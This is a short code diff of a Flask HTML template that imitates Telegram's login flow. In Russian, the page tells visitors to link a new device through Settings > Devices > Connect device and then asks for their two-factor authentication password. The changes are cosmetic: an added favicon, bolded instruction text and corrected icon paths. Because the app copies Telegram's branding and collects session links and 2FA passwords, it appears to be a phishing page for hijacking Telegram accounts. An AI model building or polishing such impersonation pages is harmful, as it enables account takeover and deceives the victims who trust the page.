@@ -6,6 +6,7 @@
     <title>Telegram</title>
     <meta name="description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
     <meta name="theme-color" content="#0088cc">
+    <link rel="icon" type="image/png" href="{{ url_for('static', filename='img/tg_icon.png') }}">
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
@@ -26,7 +27,7 @@
                     </div>
                     <div class="instruction-item">
                         <span class="instruction-number">2</span>
-                        <span class="instruction-text">Откройте Настройки → Устройства → Подключить устройство</span>
+                        <span class="instruction-text">Откройте <strong>Настройки > Устройства > Подключить устройство</strong></span>
                     </div>
                     <div class="instruction-item">
                         <span class="instruction-number">3</span>
@@ -41,7 +42,7 @@
             <div class="card">
                 <div class="password-header">
                     <div class="password-logo">
-                        <img src="{{ url_for('static', filename='tg_icon.png') }}" alt="Telegram">
+                        <img src="{{ url_for('static', filename='img/tg_icon.png') }}" alt="Telegram">
                     </div>
                     <h1>Введите пароль</h1>
                     <p class="subtitle">Требуется двухфакторная аутентификация</p>
